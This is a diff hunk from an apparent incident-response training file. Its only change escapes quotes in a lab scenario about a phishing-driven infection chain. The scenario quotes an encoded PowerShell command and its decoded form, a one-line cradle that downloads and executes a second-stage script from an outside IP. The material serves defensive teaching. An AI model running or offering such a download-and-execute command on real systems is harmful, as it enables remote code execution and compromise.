@@ -27204,7 +27204,7 @@ Get-AuthenticodeSignature "C:\\path\\to\\suspicious.exe"
         "Determine the likely attack vector",
         "Recommend response actions"
       ],
-      labScenario: "EDR alerts on workstation WS-ACCT-05 (user: l.garcia, Accounting dept). Sysmon Event ID 1 shows the following process chain: explorer.exe → outlook.exe → WINWORD.EXE → cmd.exe → powershell.exe. The PowerShell command line contains: 'powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'. The encoded command, when decoded, reveals: 'IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.33/stage2.ps1")'. The download occurred at 09:45 UTC, and since then, the workstation has been beaconing to the same IP every 60 seconds on port 443.",
+      labScenario: "EDR alerts on workstation WS-ACCT-05 (user: l.garcia, Accounting dept). Sysmon Event ID 1 shows the following process chain: explorer.exe → outlook.exe → WINWORD.EXE → cmd.exe → powershell.exe. The PowerShell command line contains: 'powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'. The encoded command, when decoded, reveals: 'IEX (New-Object Net.WebClient).DownloadString(\"http://185.220.101.33/stage2.ps1\")'. The download occurred at 09:45 UTC, and since then, the workstation has been beaconing to the same IP every 60 seconds on port 443.",
       labQuestions: [
         {
           id: "salp-4.1-q1",
